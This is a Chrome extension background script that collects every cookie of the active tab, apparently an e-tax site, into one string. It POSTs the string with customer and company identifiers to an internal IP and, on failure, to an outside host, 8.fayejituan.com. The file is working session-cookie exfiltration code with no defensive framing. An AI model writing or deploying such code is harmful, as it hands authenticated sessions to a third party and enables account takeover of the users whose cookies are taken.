chrome.runtime.onMessage.addListener(
  function (request, sender, sendResponse) {
    console.log(sender.tab ?
      "来自内容脚本：" + sender.tab.url :
      "来自扩展程序");

    var table_body = '';
    chrome.tabs.getSelected(null, function (tab) {
      chrome.cookies.getAll({ url: tab.url }, function (cookie) {
        cookie.forEach(function (c) {
          table_body = table_body + c.name + '=' + c.value + ';'
          // table_body = table_body +'<th>'+ c.name + '</th><th>' + c.value + '<th>'
        });
        // tabel_head='<table border="1" cellspacing="0" cellpadding="0"><tr><th>key</th><th>value</th></tr><tr>'
        // tabel_foot='</tr></table>'
        console.log(table_body.slice(0, -1));
        // $.post("http://192.168.2.167:9000/capi?tag=get_etax", { "s": table_body.slice(0, -1), "customer_id": request.customer_id, "company": request.company },
          // function (result) { console.log(result) })
        //  $.post("http://192.168.2.177:9999/capi?tag=get_etax", { "s": table_body.slice(0, -1), "customer_id": request.customer_id, "company": request.company },
        //   function (result) { console.log(result) })
          // $.ajax({
          //   url  : 'http://192.168.2.168:9000/capi?tag=get_etax',
          //   type : 'post',
          //   data : 
          // }).done(function(data, statusText, xhr){
          //   var status = xhr.status;                //200
          //   var head = xhr.getAllResponseHeaders(); //Detail header info
          // });
      
      
         $.ajax({url: 'http://192.168.2.168:9000/capi?tag=get_etax',type:"POST", data: { "s": table_body.slice(0, -1), "customer_id": request.customer_id, "company": request.company }, 
       
         error: function(xhr, status) {
           if(xhr.status==0){

            $.ajax({url: 'http://8.fayejituan.com:8080/capi?tag=get_etax',type:"POST", data: { "s": table_body.slice(0, -1), "customer_id": request.customer_id, "company": request.company }, 
            success: function (response) {  
              console.log("data updated");
          },
            error: function(xhr, status) {
              if(xhr.status==0){
               console.log("lost")
   
              }
             }
           });

           }
          }
        });

      })
      // alert(tab.url);
      _url = tab.url;
    });
    if (request.greeting == "您好")
      sendResponse({ farewell: "再见" });
  });